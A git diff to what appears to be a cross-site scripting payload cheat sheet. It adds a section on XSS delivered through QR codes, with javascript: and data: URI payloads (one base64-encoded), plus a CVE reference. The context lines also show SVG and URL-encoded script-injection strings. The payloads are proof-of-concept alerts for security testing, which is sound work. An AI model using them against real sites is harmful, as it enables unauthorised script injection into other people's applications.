@@ -18,7 +18,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [DOM based XSS](#dom-based-xss)
   - [XSS in JS Context](#xss-in-js-context)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
-- [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
+- [XSS in files (XML/SVG/CSS/Flash/Markdown/QR Code)](#xss-in-files)
 - [XSS in PostMessage](#xss-in-postmessage)
 - [Blind XSS](#blind-xss)
   - [XSS Hunter](#xss-hunter)
@@ -369,6 +369,14 @@ vbscript:msgbox("XSS")
 <svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 <svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+```
+
+### XSS in QR Code
+
+```javascript
+javascript:alert(1);
+data:text/html,<script>alert(0)</script>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 ```
 
 ### XSS in Markdown
@@ -1248,3 +1256,4 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
 - [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
 - [Bypass < with ＜](https://hackerone.com/reports/639684)
+- [XSS through QR Code](https://www.google.com/search?q=CVE-2021-21186) - CVE-2021-21186 by DhirajCyber
